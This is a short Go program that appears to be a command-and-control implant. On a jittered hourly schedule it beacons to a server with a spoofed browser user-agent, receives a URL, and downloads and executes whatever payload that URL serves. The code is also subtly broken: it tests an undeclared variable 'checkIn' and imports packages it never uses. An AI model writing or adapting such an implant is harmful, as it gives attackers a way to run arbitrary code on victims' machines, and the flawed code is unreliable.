package main

import (
	"fmt"
	"math/rand"
	"os"
	"runtime"
	"time"

	"github.com/averagesecurityguy/c2/beacons"
	"github.com/averagesecurityguy/c2/downloaders"
)

const url = "http://127.0.0.1:8000"
const agent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0"
const offset = 12 // In seconds
const base = 1    // In hours
const sleep = 60  // In seconds

func main() {
	sysid := "uuid"
	checkin := time.Now()
	beacon := beacons.NewHttpAuthBeacon(sysid, url, agent)
	downloader := downloaders.NewHttpDownloader(agent)

	for {
		if checkIn.Before(time.Now()) {
			url := beacon.Ping()
			downloader.DownloadExec(url)
			checkin = updateCheckinTime()
		}

		time.Sleep(sleep * time.Second)
	}
}

// updateCheckinTime returns the next checkin time for the beacon. The time
// is calculated by adding base hours to the current time and a random number
// of seconds between <= offset.
func updateCheckinTime() time.Time {
	t := time.Now()
	base := time.Duration(base) * time.Hour
	jitter := time.Duration(rand.Intn(offset)) * time.Second

	return t.Add(base).Add(jitter)
}
